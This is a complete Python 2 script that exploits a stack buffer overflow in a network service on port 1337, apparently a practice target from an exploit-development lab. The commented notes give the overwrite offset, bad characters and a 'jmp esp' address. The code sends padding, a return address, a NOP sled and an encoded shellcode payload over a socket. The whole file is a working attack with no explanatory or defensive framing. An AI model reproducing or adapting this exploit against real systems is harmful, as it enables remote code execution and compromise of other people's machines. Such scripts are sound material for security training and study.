#!/usr/bin/python2.7

import socket
import sys


host = "192.168.1.4"
port = 1337
# size = 1300 old
size =  1800
prefix = "OVERFLOW3 "
payload = ""
offset = 1274
# EIP overwritten by 35714234
# [*] Exact match at offset 1274
# badchars = \x00\x11\x40\x5f\xb8\xee
# jmp esp 62501203   \x03\x12\x50\x62
try :
	# msf_pattern_create ="Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2B"
	# badchars= "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
	buf =  b""
	buf += b"\xfc\xbb\xd1\xea\xa3\xfe\xeb\x0c\x5e\x56\x31\x1e\xad"
	buf += b"\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\x2d"
	buf += b"\x02\x21\xfe\xcd\xd3\x46\x76\x28\xe2\x46\xec\x39\x55"
	buf += b"\x77\x66\x6f\x5a\xfc\x2a\x9b\xe9\x70\xe3\xac\x5a\x3e"
	buf += b"\xd5\x83\x5b\x13\x25\x82\xdf\x6e\x7a\x64\xe1\xa0\x8f"
	buf += b"\x65\x26\xdc\x62\x37\xff\xaa\xd1\xa7\x74\xe6\xe9\x4c"
	buf += b"\xc6\xe6\x69\xb1\x9f\x09\x5b\x64\xab\x53\x7b\x87\x78"
	buf += b"\xe8\x32\x9f\x9d\xd5\x8d\x14\x55\xa1\x0f\xfc\xa7\x4a"
	buf += b"\xa3\xc1\x07\xb9\xbd\x06\xaf\x22\xc8\x7e\xd3\xdf\xcb"
	buf += b"\x45\xa9\x3b\x59\x5d\x09\xcf\xf9\xb9\xab\x1c\x9f\x4a"
	buf += b"\xa7\xe9\xeb\x14\xa4\xec\x38\x2f\xd0\x65\xbf\xff\x50"
	buf += b"\x3d\xe4\xdb\x39\xe5\x85\x7a\xe4\x48\xb9\x9c\x47\x34"
	buf += b"\x1f\xd7\x6a\x21\x12\xba\xe2\x86\x1f\x44\xf3\x80\x28"
	buf += b"\x37\xc1\x0f\x83\xdf\x69\xc7\x0d\x18\x8d\xf2\xea\xb6"
	buf += b"\x70\xfd\x0a\x9f\xb6\xa9\x5a\xb7\x1f\xd2\x30\x47\x9f"
	buf += b"\x07\x96\x17\x0f\xf8\x57\xc7\xef\xa8\x3f\x0d\xe0\x97"
	buf += b"\x20\x2e\x2a\xb0\xcb\xd5\xbd\x7f\xa3\xd4\x34\xe8\xb6"
	buf += b"\xd6\x42\x3a\x3f\x30\x20\xaa\x16\xeb\xdd\x53\x33\x67"
	buf += b"\x7f\x9b\xe9\x02\xbf\x17\x1e\xf3\x0e\xd0\x6b\xe7\xe7"
	buf += b"\x10\x26\x55\xa1\x2f\x9c\xf1\x2d\xbd\x7b\x01\x3b\xde"
	buf += b"\xd3\x56\x6c\x10\x2a\x32\x80\x0b\x84\x20\x59\xcd\xef"
	buf += b"\xe0\x86\x2e\xf1\xe9\x4b\x0a\xd5\xf9\x95\x93\x51\xad"
	buf += b"\x49\xc2\x0f\x1b\x2c\xbc\xe1\xf5\xe6\x13\xa8\x91\x7f"
	buf += b"\x58\x6b\xe7\x7f\xb5\x1d\x07\x31\x60\x58\x38\xfe\xe4"
	buf += b"\x6c\x41\xe2\x94\x93\x98\xa6\xa5\xd9\x80\x8f\x2d\x84"
	buf += b"\x51\x92\x33\x37\x8c\xd1\x4d\xb4\x24\xaa\xa9\xa4\x4d"
	buf += b"\xaf\xf6\x62\xbe\xdd\x67\x07\xc0\x72\x87\x02\xc0\x74"
	buf += b"\x77\xad"


	payload += prefix
	payload += "A"*offset
	payload += "\x03\x12\x50\x62" # jmp esp 
	payload += "\x90"*16  # there is enough space
	payload +=  buf
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host,port))
	s.send(payload)
	print "[+] payload has been sent successfully\n"
	s.close()

except :

	print "[-] Host is down\n"
	sys.exit()